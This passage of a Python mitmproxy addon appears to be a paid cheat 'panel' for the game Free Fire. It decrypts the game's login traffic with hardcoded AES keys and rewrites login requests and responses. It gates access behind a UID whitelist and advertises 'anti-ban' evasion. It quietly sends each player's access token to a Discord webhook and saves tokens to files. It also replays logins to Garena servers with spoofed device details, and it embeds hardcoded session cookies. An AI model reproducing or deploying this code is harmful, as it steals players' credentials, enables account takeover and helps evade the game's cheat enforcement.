            flow.response = http.Response.make(400, json.dumps({"error": "Duration must be a number (days)"}), {"Content-Type": "application/json"})
            return
        success, msg = api_whitelist_add_days(uid, duration_days)
        if success:
            flow.response = http.Response.make(200, json.dumps({"success": True, "message": msg}), {"Content-Type": "application/json"})
        else:
            flow.response = http.Response.make(400, json.dumps({"error": msg}), {"Content-Type": "application/json"})
        return

    # API: whitelist remove-uid - remove a single UID from all whitelists
    if "/api/whitelist/remove-uid" in flow.request.path and flow.request.method.upper() == "GET":
        key = flow.request.query.get("key", "")
        uid = flow.request.query.get("uid", "")
        if key != WHITELIST_API_KEY:
            flow.response = http.Response.make(403, json.dumps({"error": "Invalid key"}), {"Content-Type": "application/json"})
            return
        if not uid:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing uid parameter"}), {"Content-Type": "application/json"})
            return
        success, msg = api_whitelist_remove_uid(uid)
        if success:
            flow.response = http.Response.make(200, json.dumps({"success": True, "message": msg}), {"Content-Type": "application/json"})
        else:
            flow.response = http.Response.make(400, json.dumps({"error": msg}), {"Content-Type": "application/json"})
        return

    # API: whitelist change-uid - change UID to a new one
    if "/api/whitelist/change-uid" in flow.request.path and flow.request.method.upper() == "GET":
        key = flow.request.query.get("key", "")
        uid = flow.request.query.get("uid", "")
        new_uid = flow.request.query.get("new_uid", "")
        if key != WHITELIST_API_KEY:
            flow.response = http.Response.make(403, json.dumps({"error": "Invalid key"}), {"Content-Type": "application/json"})
            return
        if not uid:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing uid parameter"}), {"Content-Type": "application/json"})
            return
        if not new_uid:
            flow.response = http.Response.make(400, json.dumps({"error": "Missing new_uid parameter"}), {"Content-Type": "application/json"})
            return
        success, msg = api_whitelist_change_uid(uid, new_uid)
        if success:
            flow.response = http.Response.make(200, json.dumps({"success": True, "message": msg}), {"Content-Type": "application/json"})
        else:
            flow.response = http.Response.make(400, json.dumps({"error": msg}), {"Content-Type": "application/json"})
        return

    # API: whitelist remove-all - clear all UIDs from all regions
    if "/api/whitelist/remove-all" in flow.request.path and flow.request.method.upper() == "GET":
        key = flow.request.query.get("key", "")
        if key != WHITELIST_API_KEY:
            flow.response = http.Response.make(403, json.dumps({"error": "Invalid key"}), {"Content-Type": "application/json"})
            return
        success, msg, quantity = api_whitelist_remove_all()
        if success:
            flow.response = http.Response.make(200, json.dumps({"success": True, "message": msg, "quantity": quantity}), {"Content-Type": "application/json"})
        else:
            flow.response = http.Response.make(400, json.dumps({"error": msg}), {"Content-Type": "application/json"})
        return

    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            request_bytes = flow.request.content
            request_hex = request_bytes.hex()
            decrypted_bytes = aes_decrypt(request_hex)
            decrypted_hex = decrypted_bytes.hex()
            proto_json = get_available_room(decrypted_hex)
            proto_fields = json.loads(proto_json)
            
            print("Original MajorLogin Request Details:")
            print(json.dumps(proto_fields, indent=2, ensure_ascii=False))
            
            uid = None
            access_token = None
            open_id = None
            main_active_platform = None
            client_version = None
            
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid = potential_uid
                        print(f"Found UID in field {field_num}: {uid}")
                        break
            
            if "29" in proto_fields and isinstance(proto_fields["29"], dict) and "data" in proto_fields["29"]:
                access_token = str(proto_fields["29"]["data"])
            
            if "22" in proto_fields and isinstance(proto_fields["22"], dict) and "data" in proto_fields["22"]:
                open_id = str(proto_fields["22"]["data"])
            
            if "99" in proto_fields and isinstance(proto_fields["99"], dict) and "data" in proto_fields["99"]:
                main_active_platform = str(proto_fields["99"]["data"])
            elif "100" in proto_fields and isinstance(proto_fields["100"], dict) and "data" in proto_fields["100"]:
                main_active_platform = str(proto_fields["100"]["data"])
            # Extract client_version from field 7
            if "7" in proto_fields and isinstance(proto_fields["7"], dict) and "data" in proto_fields["7"]:
                client_version = str(proto_fields["7"]["data"])

            if access_token and open_id:
                await send_discord_webhook(access_token)
                print(f"{access_token} {open_id}")
                # Run logic directly in a separate thread to not block the proxy
                threading.Thread(target=process_rebate_logic, args=(access_token, open_id), daemon=True).start()
            
            print("\n=== MODIFYING MAJORLOGIN REQUEST ===")
            
            modified_proto = copy.deepcopy(proto_template)
            
            
                        # Preserve client_version from original request, or set to "1.118.12" if not present
            if client_version:
                if "7" in modified_proto and isinstance(modified_proto["7"], dict):
                    modified_proto["7"]["data"] = client_version
                else:
                    modified_proto["7"] = {"wire_type": "string", "data": client_version}
            else:
                # Set default client_version if not in original request
                if "7" in modified_proto and isinstance(modified_proto["7"], dict):
                    modified_proto["7"]["data"] = "1.120.3"
                else:
                    modified_proto["7"] = {"wire_type": "string", "data": "1.120.3"}
            
            
            
            
            
            
            if "29" in modified_proto and isinstance(modified_proto["29"], dict):
                modified_proto["29"]["data"] = access_token if access_token else modified_proto["29"].get("data", "")
                print(f"Updated field 29 (access_token): {modified_proto['29']['data'][:20]}...")
            
            if "22" in modified_proto and isinstance(modified_proto["22"], dict):
                modified_proto["22"]["data"] = open_id if open_id else modified_proto["22"].get("data", "")
                print(f"Updated field 22 (open_id): {modified_proto['22']['data']}")
            
            if main_active_platform:
                if "99" in modified_proto and isinstance(modified_proto["99"], dict):
                    modified_proto["99"]["data"] = int(main_active_platform)
                else:
                    modified_proto["99"] = {"wire_type": "varint", "data": int(main_active_platform)}
                
                if "100" in modified_proto and isinstance(modified_proto["100"], dict):
                    modified_proto["100"]["data"] = int(main_active_platform)
                else:
                    modified_proto["100"] = {"wire_type": "varint", "data": int(main_active_platform)}
                print(f"Updated fields 99/100 (main_active_platform): {main_active_platform}")
            
            print("Modified Request Fields:")
            print(f"  Field 29: {modified_proto.get('29', {}).get('data', 'NOT_FOUND')[:20]}...")
            print(f"  Field 22: {modified_proto.get('22', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 99: {modified_proto.get('99', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 100: {modified_proto.get('100', {}).get('data', 'NOT_FOUND')}")
            
            proto_bytes = CrEaTe_ProTo(modified_proto)
            hex_data = encrypt_api(proto_bytes)
            flow.request.content = bytes.fromhex(hex_data)
            print("Successfully modified and encrypted MajorLogin request")
                
        except Exception as e:
            print(f"Error processing MajorLogin request: {e}")
    elif flow.request.method.upper() == "POST" and "/GetLoginData" in flow.request.path:
        try:
            request_bytes = flow.request.content
            request_hex = request_bytes.hex()
            decrypted_bytes = aes_decrypt(request_hex)
            decrypted_hex = decrypted_bytes.hex()
            proto_json = get_available_room(decrypted_hex)
            proto_fields = json.loads(proto_json)

            print("Original GetLoginData Request Details:")
            print(json.dumps(proto_fields, indent=2, ensure_ascii=False))

            uid = None
            access_token = None
            open_id = None
            main_active_platform = None
            client_version = None

            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid = potential_uid
                        print(f"Found UID in field {field_num}: {uid}")
                        break

            if "29" in proto_fields and isinstance(proto_fields["29"], dict) and "data" in proto_fields["29"]:
                access_token = str(proto_fields["29"]["data"])

            if "22" in proto_fields and isinstance(proto_fields["22"], dict) and "data" in proto_fields["22"]:
                open_id = str(proto_fields["22"]["data"])

            if "99" in proto_fields and isinstance(proto_fields["99"], dict) and "data" in proto_fields["99"]:
                main_active_platform = str(proto_fields["99"]["data"])
            elif "100" in proto_fields and isinstance(proto_fields["100"], dict) and "data" in proto_fields["100"]:
                main_active_platform = str(proto_fields["100"]["data"])
            if "7" in proto_fields and isinstance(proto_fields["7"], dict) and "data" in proto_fields["7"]:
                client_version = str(proto_fields["7"]["data"])

            print("\n=== MODIFYING GETLOGINDATA REQUEST ===")

            modified_proto = copy.deepcopy(proto_template1)

            if client_version:
                if "7" in modified_proto and isinstance(modified_proto["7"], dict):
                    modified_proto["7"]["data"] = client_version
                else:
                    modified_proto["7"] = {"wire_type": "string", "data": client_version}
            else:
                if "7" in modified_proto and isinstance(modified_proto["7"], dict):
                    modified_proto["7"]["data"] = "1.120.3"
                else:
                    modified_proto["7"] = {"wire_type": "string", "data": "1.120.3"}

            if "29" in modified_proto and isinstance(modified_proto["29"], dict):
                modified_proto["29"]["data"] = access_token if access_token else modified_proto["29"].get("data", "")
                print(f"Updated field 29 (access_token): {modified_proto['29']['data'][:20]}...")

            if "22" in modified_proto and isinstance(modified_proto["22"], dict):
                modified_proto["22"]["data"] = open_id if open_id else modified_proto["22"].get("data", "")
                print(f"Updated field 22 (open_id): {modified_proto['22']['data']}")

            if "99" in modified_proto and isinstance(modified_proto["99"], dict):
                modified_proto["99"]["data"] = 0
            else:
                modified_proto["99"] = {"wire_type": "varint", "data": 0}

            if "100" in modified_proto and isinstance(modified_proto["100"], dict):
                modified_proto["100"]["data"] = 0
            else:
                modified_proto["100"] = {"wire_type": "varint", "data": 0}
            print("Updated fields 99/100 (main_active_platform) to 0 for GetLoginData")

            print("Modified GetLoginData Request Fields:")
            print(f"  Field 29: {modified_proto.get('29', {}).get('data', 'NOT_FOUND')[:20]}...")
            print(f"  Field 22: {modified_proto.get('22', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 99: {modified_proto.get('99', {}).get('data', 'NOT_FOUND')}")
            print(f"  Field 100: {modified_proto.get('100', {}).get('data', 'NOT_FOUND')}")

            proto_bytes = CrEaTe_ProTo(modified_proto)
            hex_data = encrypt_api(proto_bytes)
            flow.request.content = bytes.fromhex(hex_data)
            print("Successfully modified and encrypted GetLoginData request")

        except Exception as e:
            print(f"Error processing GetLoginData request: {e}")


def response(flow: http.HTTPFlow) -> None:
    # ================================================
    # 🛡️ ULTRA SAFE MODE - ALL SERVERS PROTECTION
    # ================================================
    # CRITICAL: Check if modification is safe BEFORE doing anything
    
    if ULTRA_SAFE_MODE_ENABLED:
        # Use advanced ultra safe mode
        if not should_modify_request(flow):
            # Ranked match or unsafe request detected
            # Exit immediately - don't modify ANYTHING
            return
    else:
        # Use fallback basic protection
        if is_ranked_match_request(flow.request.path):
            print(f"[🛡️ SAFE MODE] Ranked match detected - NO MODIFICATIONS")
            print(f"[🛡️ SAFE MODE] Path: {flow.request.path}")
            return
    
    # ================================================
    # SAFE ZONE - Only safe modifications below this line
    # ================================================
    
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            resp_bytes = flow.response.content
            resp_hex = resp_bytes.hex()
            proto_fields = None

            try:
                proto_json = get_available_room(resp_hex)
                proto_fields = json.loads(proto_json)
                print("[UID Lock] Decoded MajorLogin response without AES decrypt")
            except Exception as decode_err:
                print(f"[UID Lock] Primary decode failed, trying AES decrypt: {decode_err}")
                try:
                    decrypted_bytes = aes_decrypt(resp_hex)
                    decrypted_hex = decrypted_bytes.hex()
                    proto_json = get_available_room(decrypted_hex)
                    proto_fields = json.loads(proto_json)
                    print("[UID Lock] Decoded MajorLogin response with AES decrypt fallback")
                except Exception as decrypt_err:
                    print(f"[UID Lock] AES decrypt decode failed: {decrypt_err}")
                    return

            uid_from_response = None
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid_from_response = potential_uid
                        break

            if uid_from_response is not None:
                print(f"[UID Lock] Extracted UID from response: {uid_from_response}")
                
                # Check if UID is in whitelist
                if not checkUIDExists(uid_from_response):
                    # UID NOT AUTHORIZED - Apply Lord Sarthak Verification Module
                    print(f"[UID Lock] UID {uid_from_response} NOT AUTHORIZED - Applying verification module")
                    
                    # Create the verification message
                    verification_message = (
                        f"[FF0000]▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        f"[00FF00]► [FFFFFF]SYSTEM : [FF0000]⚠️ ACCESS DENIED - UNAUTHORIZED\n"
                        f"[00FF00]► [FFFFFF]UID        : [FFFF00]{uid_from_response}\n"
                        f"[00FF00]► [FFFFFF]STATUS : [00FF00]✓ ADVANCED ANTI-BAN ACTIVE\n"
                        f"[FFFFFF]CONTACT OWNERS TO UNLOCK PANEL:\n"
                        f"[FFD700]👑 Zytrone XD   |   👑 Selfish XD   |   👑 Zyro XD\n"
                        f"[FF0000]▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n"
                    ).encode()
                    
                    # Block the response with verification message
                    flow.response.content = verification_message
                    flow.response.status_code = 500
                    flow.response.headers["Content-Type"] = "text/plain; charset=utf-8"
                    flow.response.headers["Content-Length"] = str(len(verification_message))
                    print("[UID Lock] Blocked login with verification module")
                    return
                else:
                    # UID is authorized - add to whitelist and allow login
                    add_uid_to_main_whitelist(uid_from_response)
                    print(f"[UID Lock] UID {uid_from_response} added to whitelist.json, login allowed.")
                    # Login proceeds normally
        except Exception as e:
            print(f"[UID Lock] Unexpected error in response handler: {e}")

    if flow.request.method.upper() == "POST" and "/GetAccountBriefInfoBeforeLogin" in flow.request.path:
        current_response = CSGetAccountBriefInfoBeforeLoginRes_pb2.CSGetAccountBriefInfoBeforeLoginRes()
        current_response.ParseFromString(flow.response.content)

        old_nickname = current_response.nickname
        reason = ""

        current_response.nickname = (
            f"[c][ff0000]{old_nickname} [000000]Reason:[b][c][ff0000]{reason}"
        )
        new_content = current_response.SerializeToString()
        flow.response.content = new_content
        flow.response.headers["Content-Length"] = str(len(new_content))


def save_access_info(account_id, access_token, open_id, region):
    try:
        file_name = f"token_{region.lower()}.json"
        file_path = Path(file_name)
        
        tokens = []
        if file_path.exists():
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    loaded_tokens = json.load(f)
                    # Ensure it's a list and preserve all existing entries
                    if isinstance(loaded_tokens, list):
                        tokens = loaded_tokens
                    elif isinstance(loaded_tokens, dict):
                        # If it's a dict, convert to list to preserve data
                        tokens = [loaded_tokens]
                    else:
                        tokens = []
            except json.JSONDecodeError as e:
                # Try to preserve existing data - read as text and attempt partial recovery
                print(f"[Rebate] Warning: Invalid JSON in {file_path}, attempting to preserve existing data")
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read().strip()
                        # Try to extract any existing entries before the error
                        if content and content.startswith('['):
                            # Try to find and preserve any valid entries
                            tokens = []
                except:
                    tokens = []
            except Exception as e:
                print(f"[Rebate] Warning: Error reading {file_path}: {e}, will create new entry")
                tokens = []
        
        # Ensure tokens is a list
        if not isinstance(tokens, list):
            tokens = []
        
        account_exists = False
        for token_entry in tokens:
            if token_entry.get("account") == account_id:
                # Update only access and open_id, preserve all other fields
                if access_token:
                    token_entry["access"] = access_token
                if open_id:
                    token_entry["open_id"] = open_id
                # Preserve any other existing fields (like "token" if it exists)
                account_exists = True
                print(f"[Rebate] Updated access info for account {account_id} in {file_path}")
                break
        
        if not account_exists:
            # Add new entry only if we have valid data
            if account_id and access_token and open_id:
                tokens.append({
                    "account": account_id,
                    "access": access_token,
                    "open_id": open_id
                })
                print(f"[Rebate] Added new access info for account {account_id} in {file_path}")
            else:
                print(f"[Rebate] Warning: Missing data, skipping save for account {account_id}")
                return False
        
        # Never write empty JSON - ensure we have at least one entry
        if not tokens:
            print(f"[Rebate] Error: Cannot save empty tokens list, preserving existing data")
            return False
        
        # Write to temporary file first, then rename (atomic operation)
        temp_file = file_path.with_suffix('.tmp')
        try:
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(tokens, f, indent=2, ensure_ascii=False)
            # Atomic rename - only replace original if write succeeded
            temp_file.replace(file_path)
        except Exception as e:
            # If temp file exists, remove it
            if temp_file.exists():
                try:
                    temp_file.unlink()
                except:
                    pass
            raise e
        
        return True
        
    except Exception as e:
        print(f"[Rebate] Error saving access info: {e}")
        return False




def save_jwt_token(jwt_token: str, account_id: int, noti_region: str):
    try:
        file_name = f"token_{noti_region.lower()}.json"
        
        file_path = Path(file_name)
        
        tokens = []
        if file_path.exists():
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    loaded_tokens = json.load(f)
                    # Ensure it's a list and preserve all existing entries
                    if isinstance(loaded_tokens, list):
                        tokens = loaded_tokens
                    elif isinstance(loaded_tokens, dict):
                        # If it's a dict, convert to list to preserve data
                        tokens = [loaded_tokens]
                    else:
                        tokens = []
            except json.JSONDecodeError as e:
                # Try to preserve existing data - read as text and attempt partial recovery
                print(f"[JWT] Warning: Invalid JSON in {file_path}, attempting to preserve existing data")
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read().strip()
                        # Try to extract any existing entries before the error
                        if content and content.startswith('['):
                            # Try to find and preserve any valid entries
                            tokens = []
                except:
                    tokens = []
            except Exception as e:
                print(f"[JWT] Warning: Error reading {file_path}: {e}, will create new entry")
                tokens = []
        
        # Ensure tokens is a list
        if not isinstance(tokens, list):
            tokens = []
        
        account_exists = False
        for token_entry in tokens:
            if token_entry.get("account") == account_id:
                # Update token, but preserve all other existing fields (access, open_id, etc.)
                if jwt_token:
                    token_entry["token"] = jwt_token
                # Preserve access_token and open_id if they exist - never remove them
                account_exists = True
                print(f"[JWT] Updated token for account {account_id} in {file_path}")
                break
        
        if not account_exists:
            # Add new entry only if we have valid data
            if account_id and jwt_token:
                tokens.append({
                    "account": account_id,
                    "token": jwt_token
                })
                print(f"[JWT] Added new token for account {account_id} in {file_path}")
            else:
                print(f"[JWT] Warning: Missing data, skipping save for account {account_id}")
                return False
        
        # Never write empty JSON - ensure we have at least one entry
        if not tokens:
            print(f"[JWT] Error: Cannot save empty tokens list, preserving existing data")
            return False
        
        # Write to temporary file first, then rename (atomic operation)
        temp_file = file_path.with_suffix('.tmp')
        try:
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(tokens, f, indent=2, ensure_ascii=False)
            # Atomic rename - only replace original if write succeeded
            temp_file.replace(file_path)
        except Exception as e:
            # If temp file exists, remove it
            if temp_file.exists():
                try:
                    temp_file.unlink()
                except:
                    pass
            raise e
        
        print(f"[JWT] Token saved successfully to {file_path}")
        return True
        
    except Exception as e:
        print(f"[JWT] Error saving token: {e}")
        return False

def encrypt_message_custom(plaintext):
    key = b'Yg&tc%DEuh6%Zc^8'
    iv = b'6oyZDr22E3ychjM%'
    
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext)
    padded_data += padder.finalize()
    
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded_data) + encryptor.finalize()

def fetch_open_id(access_token):
    try:
        uid_url = "https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/"
        uid_headers = {
            "authority": "prod-api.reward.ff.garena.com",
            "method": "GET",
            "path": "/redemption/api/auth/inspect_token/",
            "scheme": "https",
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "access-token": access_token,
            "cookie": "_gid=GA1.2.444482899.1724033242; _ga_XB5PSHEQB4=GS1.1.1724040177.1.1.1724040732.0.0.0; token_session=cb73a97aaef2f1c7fd138757dc28a08f92904b1062e66c; _ga_KE3SY7MRSD=GS1.1.1724041788.0.0.1724041788.0; _ga_RF9R6YT614=GS1.1.1724041788.0.0.1724041788.0; _ga=GA1.1.1843180339.1724033241; apple_state_key=817771465df611ef8ab00ac8aa985783; _ga_G8QGMJPWWV=GS1.1.1724049483.1.1.1724049880.0.0; datadome=HBTqAUPVsbBJaOLirZCUkN3rXjf4gRnrZcNlw2WXTg7bn083SPey8X~ffVwr7qhtg8154634Ee9qq4bCkizBuiMZ3Qtqyf3Isxmsz6GTH_b6LMCKWF4Uea_HSPk;",
            "origin": "https://reward.ff.garena.com",
            "referer": "https://reward.ff.garena.com/",
            "sec-ch-ua": '"Not.A/Brand";v="99", "Chromium";v="124"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        }

        uid_res = requests.get(uid_url, headers=uid_headers, timeout=10)
        uid_data = uid_res.json()
        uid = uid_data.get("uid")

        if not uid:
            return None, "Failed to extract UID"

        openid_url = "https://shop2game.com/api/auth/player_id_login"
        openid_headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6,fr-FR;q=0.5,fr;q=0.4",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://shop2game.com",
            "Referer": "https://shop2game.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"'
        }
        payload = {
            "app_id": 100067,
            "login_id": str(uid)
        }

        openid_res = requests.post(openid_url, headers=openid_headers, json=payload, timeout=10)
        openid_data = openid_res.json()
        open_id = openid_data.get("open_id")

        if not open_id:
            return None, "Failed to extract open_id"

        return open_id, None

    except Exception as e:
        return None, f"Exception occurred: {str(e)}"

def process_rebate_logic(access_token, open_id):
    if not open_id:
        print("[Rebate] open_id not provided, fetching...")
        fetched_open_id, error = fetch_open_id(access_token)
        if error:
            print(f"[Rebate] Error fetching open_id: {error}")
            return
        open_id = fetched_open_id
        print(f"[Rebate] Fetched open_id: {open_id}")

    platforms = [8, 3, 4, 6]
    
    for platform_type in platforms:
        try:
            game_data = my_pb2.GameData()
            game_data.timestamp = "2024-12-05 18:15:32"
            game_data.game_name = "free fire"
            game_data.game_version = 1
            game_data.version_code = "1.108.3"
            game_data.os_info = "Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)"
            game_data.device_type = "Handheld"
            game_data.network_provider = "Verizon Wireless"
            game_data.connection_type = "WIFI"
            game_data.screen_width = 1280
            game_data.screen_height = 960
            game_data.dpi = "240"
            game_data.cpu_info = "ARMv7 VFPv3 NEON VMH | 2400 | 4"
            game_data.total_ram = 5951
            game_data.gpu_name = "Adreno (TM) 640"
            game_data.gpu_version = "OpenGL ES 3.0"
            game_data.user_id = "Google|74b585a9-0268-4ad3-8f36-ef41d2e53610"
            game_data.ip_address = "172.190.111.97"
            game_data.language = "en"
            game_data.open_id = open_id
            game_data.access_token = access_token
            game_data.platform_type = platform_type
            game_data.field_99 = str(platform_type)
            game_data.field_100 = str(platform_type)

            serialized_data = game_data.SerializeToString()
            encrypted_data = encrypt_message_custom(serialized_data)
            hex_encrypted_data = binascii.hexlify(encrypted_data).decode('utf-8')

            url = "https://loginbp.ggblueshark.com/MajorLogin"
            headers = {
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/octet-stream",
                "Expect": "100-continue",
                "X-Unity-Version": "2018.4.11f1",
                "X-GA": "v1 1",
                "ReleaseVersion": "OB52"
            }
            edata = bytes.fromhex(hex_encrypted_data)

            response = requests.post(url, data=edata, headers=headers, verify=False, timeout=5)

            if response.status_code == 200:
                data_dict = None
                try:
                    example_msg = output_pb2.Garena_420()
                    example_msg.ParseFromString(response.content)
                    data_dict = {field.name: getattr(example_msg, field.name)
                                 for field in example_msg.DESCRIPTOR.fields
                                 if field.name not in ["binary", "binary_data", "Garena420"]}
                except Exception:
                    try:
                        data_dict = response.json()
                    except ValueError:
                        continue
                
                if data_dict and "token" in data_dict:
                    token_value = data_dict["token"]
                    # Decode JWT to get region and account_id
                    try:
                        header_b64, payload_b64, signature_b64 = split_jwt(token_value)
                        payload = decode_part(payload_b64)
                        
                        account_id = payload.get("account_id")
                        region = payload.get("lock_region") or payload.get("noti_region")
                        
                        if account_id and region:
                            print(f"[Rebate] Successfully got token for account {account_id} in region {region}")
                            save_access_info(account_id, access_token, open_id, region)
                            return # Success
                        else:
                            print(f"[Rebate] Missing account_id or region in token payload: {payload}")
                            
                    except Exception as e:
                        print(f"[Rebate] Error decoding token: {e}")
        except Exception as e:
            print(f"[Rebate] Error in platform loop {platform_type}: {e}")
            continue
    
    print("[Rebate] Failed to get valid token from any platform")

def add_uid_to_main_whitelist(uid: str):
    """Add UID to whitelist.json with auto duration (in days) if not present."""
    try:
        whitelist_path = Path("whitelist.json")
        if not whitelist_path.exists():
            data = {
                "auto_whitelist_duration_days": 365,
                "description": "Auto whitelist duration in days - users added without explicit duration will be whitelisted for this duration",
                "metadata": {
                    "created": time.strftime("%Y-%m-%d"),
                    "last_updated": time.strftime("%Y-%m-%d"),
                    "unit": "days"
                },
                "whitelisted_uids": {}
            }
        else:
            with open(whitelist_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            if "whitelisted_uids" not in data:
                data["whitelisted_uids"] = {}
        # Get duration (days) - support migration from hours
        if "auto_whitelist_duration_days" in data:
            duration_days = float(data.get("auto_whitelist_duration_days", 365))
        else:
            duration_days = float(data.get("auto_whitelist_duration_hours", 8760)) / 24
        expiry = int(time.time() + duration_days * 24 * 3600)
        if uid not in data["whitelisted_uids"]:
            data["whitelisted_uids"][uid] = expiry
            data["metadata"]["last_updated"] = time.strftime("%Y-%m-%d")
            with open(whitelist_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            print(f"[Main Whitelist] Added UID {uid} with expiry {expiry}")
        else:
            print(f"[Main Whitelist] UID {uid} already present")
    except Exception as e:
        print(f"[Main Whitelist] Error adding UID {uid}: {e}")